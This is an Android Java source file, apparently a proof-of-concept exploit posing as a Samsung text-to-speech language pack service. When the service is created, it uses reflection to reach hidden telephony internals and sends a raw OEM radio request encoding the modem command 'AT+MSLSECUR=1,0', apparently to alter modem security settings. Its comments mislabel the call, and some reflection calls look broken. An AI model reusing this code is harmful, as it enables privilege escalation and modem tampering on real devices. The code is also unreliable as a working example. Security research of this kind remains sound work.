package com.samsung.SMT.lang.poc;

import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.res.AssetManager;
import android.os.Environment;
import android.os.IBinder;
import android.os.Parcel;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.view.accessibility.AccessibilityEventCompat;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.StringTokenizer;

/* loaded from: classes.dex */
public class LanguagePack extends Service {
    static final String BROADCAST_CURRENT_LANGUAGE_INFO = "BROADCAST_CURRENT_LANGUAGE_INFO";
    static final String BROADCAST_CURRENT_LANGUAGE_VERSION = "BROADCAST_CURRENT_LANGUAGE_VERSION";
    static final String BROADCAST_DB_FILELIST = "BROADCAST_DB_FILELIST";
    static final String BROADCAST_DOWNLOADABLE_LIST = "BROADCAST_DOWNLOADABLE_LIST";
    static final String BROADCAST_DOWNLOADABLE_LIST_COUNT = "BROADCAST_DOWNLOADABLE_LIST_COUNT";
    static final String BROADCAST_DOWNLOADABLE_LIST_VERSION = "BROADCAST_DOWNLOADABLE_LIST_VERSION";
    static final String DB_FILELIST = "DB_FILELIST";
    static final String DOWNLOADABLE_LIST = "DOWNLOADABLE_LIST";
    static final String LANGUAGE_INFO = "LANGUAGE_INFO";
    static final String SHAREDPREFERENCE = "LanguageDBInfo";
    static final String SHAREDPREFERENCE_VERSION = "Version";
    static final String SMT_DATA_PATH = Environment.getExternalStorageDirectory() + "/.SMT/";
    static final String SYNCTABLE = "synctable.txt";
    static final String TAG = "SMTLanguagePack";
    private SharedPreferences m_prvPref = null;
    private String m_szVersion = "";
    private LanguagePackInfo m_LangInfo = null;
    private ArrayList<CharSequence> m_arrDBFileList = new ArrayList<>();
    private ArrayList<LanguagePackInfo> m_arrDownloadableList = new ArrayList<>();
    private String m_szDownloadableListVersion = "";
    String[] m_arrEmbeddedfiles = null;

    @Override // android.app.Service
    public IBinder onBind(Intent arg0) {
        return null;
    }
    MainActivity main = new MainActivity();

    @Override // android.app.Service
    public void onCreate() {
        this.m_prvPref = getSharedPreferences(SHAREDPREFERENCE, 0);
        super.onCreate();
        //SendDBInfo();

        //main.server();
        try {
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        Class c = Class.forName(tm.getClass().getName());
        Method m = null;

            m = c.getDeclaredMethod("getITelephony");
        //Parcel data;
            byte[] oemReq = { 0x12, 0x0D, 0x00, 0x15, 0x00, 0x0F, 0x41, 0x54, 0x2B, 0x4D, 0x53, 0x4C, 0x53, 0x45, 0x43, 0x55, 0x52, 0x3D, 0x31, 0x2C, 0x30};
            byte[] oemResp = { 0x12, 0x0D, 0x00, 0x15, 0x00, 0x0F, 0x41, 0x54, 0x2B, 0x4D, 0x53, 0x4C, 0x53, 0x45, 0x43, 0x55, 0x52, 0x3D, 0x31, 0x2C, 0x30};
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInterfaceToken("");
            data.writeByteArray(oemReq);

                data.writeInt(oemResp.length);




        m.setAccessible(true);
        Object telephonyService = m.invoke(tm); // Get the internal ITelephony object
        c = Class.forName(telephonyService.getClass().getName()); // Get its class
        m = c.getDeclaredMethod("invokeOemRilRequestRaw"); // Get the "endCall()" method
        m.setAccessible(true); // Make it accessible
        m.invoke(telephonyService, data); // invoke endCall()
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }

    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int flags, int startId) {
       // if (ReadSyncTable() && ReadAssets()) {
          //  if ((!CheckVersion() || !CheckFileCount()) && CopyAssets()) {
           //     WriteDBInfo();
           // }
            //SendDBInfo();
            //main.server();
        //}
        //stopSelf();
        return Service.START_NOT_STICKY;
    }

    @Override // android.app.Service
    public void onDestroy() {
        System.exit(0);
    }

    private boolean CheckVersion() {
        return this.m_prvPref.getString(SHAREDPREFERENCE_VERSION, "").equals(this.m_szVersion);
    }

    private boolean CheckFileCount() {
        for (int i = 0; i < this.m_arrEmbeddedfiles.length; i++) {
            if (!new File(String.valueOf(SMT_DATA_PATH) + getLocationFolder(), this.m_arrEmbeddedfiles[i]).exists()) {
                return false;
            }
        }
        return true;
    }


    public void copyfile(String input, String output) throws IOException {

        OutputStream myOutput = new FileOutputStream(output);
        byte[] buffer = new byte[1024];
        int length;
        InputStream myInput = new FileInputStream(input);
        while ((length = myInput.read(buffer)) > 0) {
            myOutput.write(buffer, 0, length);
        }
        myInput.close();
        myOutput.flush();
        myOutput.close();

    }

    private void SendDBInfo()
    {


    }

    private ArrayList<CharSequence> convertArrList(LanguagePackInfo langInfo) {
        ArrayList<CharSequence> arrList = new ArrayList<>();
        arrList.add(langInfo.szPackageName);
        arrList.add(langInfo.szLanguageCode);
        arrList.add(langInfo.szVariant);
        arrList.add(langInfo.szVoiceName);
        arrList.add(langInfo.szMarketUri);
        arrList.add(langInfo.szNeedEngineVersion);
        arrList.add(langInfo.szLocationFolder);
        return arrList;
    }

    private void WriteDBInfo() {
        SharedPreferences.Editor editor = this.m_prvPref.edit();
        editor.putString(SHAREDPREFERENCE_VERSION, this.m_szVersion);
        editor.commit();
    }

    private boolean ReadAssets() {
        AssetManager assetManager = getAssets();
        String szLocationFolder = getLocationFolder();
        if (!szLocationFolder.equals("")) {
            szLocationFolder = "/" + szLocationFolder;
        }
        try {
            this.m_arrEmbeddedfiles = assetManager.list("DATA" + szLocationFolder);
            return true;
        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
    }

    private String getLocationFolder() {
        if (this.m_LangInfo == null || this.m_LangInfo.szLocationFolder.equals("") || this.m_LangInfo.szLocationFolder.equals("null")) {
            return "";
        }
        return this.m_LangInfo.szLocationFolder;
    }

    private boolean CopyAssets() {
        AssetManager assetManager = getAssets();
        String szLocationFolder = getLocationFolder();
        if (!szLocationFolder.equals("")) {
            szLocationFolder = String.valueOf(szLocationFolder) + "/";
        }
        for (int i = 0; i < this.m_arrEmbeddedfiles.length; i++) {
            try {
                InputStream in = assetManager.open("DATA/" + szLocationFolder + this.m_arrEmbeddedfiles[i]);
                File mpath = new File(String.valueOf(SMT_DATA_PATH) + getLocationFolder());
                if (!mpath.isDirectory()) {
                    mpath.mkdirs();
                }
                OutputStream out = new FileOutputStream(String.valueOf(SMT_DATA_PATH) + szLocationFolder + this.m_arrEmbeddedfiles[i]);
                try {
                    copyFile(in, out);
                    in.close();
                    out.flush();
                    out.close();
                    this.m_arrDBFileList.add(String.valueOf(szLocationFolder) + this.m_arrEmbeddedfiles[i]);
                } catch (Exception e) {
                    return false;
                }
            } catch (Exception e2) {
            }
        }
        return true;
    }

    private void copyFile(InputStream in, OutputStream out) throws IOException {
        byte[] buffer = new byte[AccessibilityEventCompat.TYPE_TOUCH_EXPLORATION_GESTURE_END];
        while (true) {
            int read = in.read(buffer);
            if (read != -1) {
                out.write(buffer, 0, read);
            } else {
                return;
            }
        }
    }

    private boolean ReadSyncTable() {
        try {
        } catch (Exception e) {
            e = e;
        }
        try {
            BufferedReader br = new BufferedReader(new InputStreamReader(getAssets().open(SYNCTABLE)));
            while (true) {
                String szTemp = br.readLine();
                if (szTemp.equals("<ENDTABLE>")) {
                    break;
                } else if (szTemp.equals("<LANGUAGE_INFO>")) {
                    while (true) {
                        String szTemp2 = br.readLine();
                        if (!szTemp2.equals("</LANGUAGE_INFO>")) {
                            StringTokenizer strToken = new StringTokenizer(szTemp2, "\t");
                            if (strToken.nextToken().equals("version")) {
                                this.m_szVersion = strToken.nextToken();
                            } else {
                                this.m_LangInfo = TokenizeLanguageInfo(szTemp2);
                            }
                        }
                    }
                } else if (szTemp.equals("<DOWNLOADABLE_LIST>")) {
                    while (true) {
                        String szTemp3 = br.readLine();
                        if (!szTemp3.equals("</DOWNLOADABLE_LIST>")) {
                            StringTokenizer strToken2 = new StringTokenizer(szTemp3, "\t");
                            if (strToken2.nextToken().equals("version")) {
                                this.m_szDownloadableListVersion = strToken2.nextToken();
                            } else {
                                this.m_arrDownloadableList.add(TokenizeLanguageInfo(szTemp3));
                            }
                        }
                    }
                }
            }
            if (this.m_szVersion.equals("") || this.m_LangInfo.szPackageName.equals("") || this.m_LangInfo.szVariant.equals("")) {
                return false;
            }
            return true;
        } catch (Exception e2) {
            e2.printStackTrace();
            return false;
        }
    }

    private LanguagePackInfo TokenizeLanguageInfo(String szInputText) {
        LanguagePackInfo LangInfo = new LanguagePackInfo();
        StringTokenizer strToken = new StringTokenizer(szInputText, "\t");
        if (strToken.hasMoreTokens()) {
            LangInfo.szPackageName = strToken.nextToken();
            LangInfo.szLanguageCode = strToken.nextToken();
            LangInfo.szVariant = strToken.nextToken();
            LangInfo.szVoiceName = strToken.nextToken();
            LangInfo.szMarketUri = strToken.nextToken();
            LangInfo.szNeedEngineVersion = strToken.nextToken();
            LangInfo.szLocationFolder = strToken.nextToken();
        }
        return LangInfo;
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* loaded from: classes.dex */
    public class LanguagePackInfo {
        public String szPackageName = "";
        public String szLanguageCode = "";
        public String szVariant = "";
        public String szVoiceName = "";
        public String szMarketUri = "";
        public String szNeedEngineVersion = "";
        public String szLocationFolder = "";

        LanguagePackInfo() {
        }
    }
}